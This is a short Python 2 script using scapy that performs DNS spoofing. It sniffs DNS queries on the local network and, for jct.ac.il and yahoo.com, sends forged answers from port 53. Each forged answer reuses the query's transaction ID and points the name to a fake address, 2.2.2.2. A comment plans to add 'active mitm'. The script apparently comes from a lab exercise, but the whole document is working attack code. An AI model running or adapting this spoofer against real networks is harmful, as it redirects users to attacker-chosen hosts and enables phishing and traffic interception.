#!/usr/bin/env python
from scapy.all import *

def makeme(pkt,name):
	print "is" + name
	res = IP(dst=pkt[IP].src,src=pkt[IP].dst)
	#res = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,an=DNSRR(rranme=pkt[DNSQR].qname,rdata='2.2.2.2'))
	# in udp layer, we answer with port he asked, and our sport is 53 
	# (we're supposed to be the server answering.)
	print "ip done"
	res = res/UDP(dport=pkt[UDP].sport,sport=53)
	# id is same as he send (no need for guessing this time)
	# ancount = how many answers we have(just one for jct)
	# an - the actual answer, with the glue data being the same I guess.
	# using fake ip = 2.2.2.2 just for example.
	print "udp done"
	print "req: " + pkt[DNSQR].qname
	res = res/DNS(id=pkt[DNS].id,qr=1,rd=pkt[DNS].rd,qdcount=1,qd=pkt[DNS].qd,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,ttl=200,rdata='2.2.2.2'))
	print "dns"
	#res = res/DNSRR(rrname='jct.ac.il',rdata='2.2.2.2')
	#print "dnsrr"	
	print(type(res))	
	print "info on sending:"		
	print res.summary()
	send(res)
	print "sent"

print "started"
bpf = "ip src 10.7.8.244 and udp src port 53 or udp dst port 53"
while True:
	pkt = sniff(filter=bpf,count=1)
	print "sniffed a dns query"
	print "here it is:"
	print pkt[0].summary()		
	pkt=pkt[0]
	if ('jct.ac.il' in str(pkt['DNSQR'].qname) and (pkt[UDP].dport==53)):
		makeme(pkt,'jct')

	# maybe later add active mitm. 
	elif ('yahoo.com' in str(pkt['DNSQR'].qname) and (pkt[UDP].dport==53)):
		makeme(pkt,'yahoo')
	else:
		print "is dns, but not jct or yahoo"

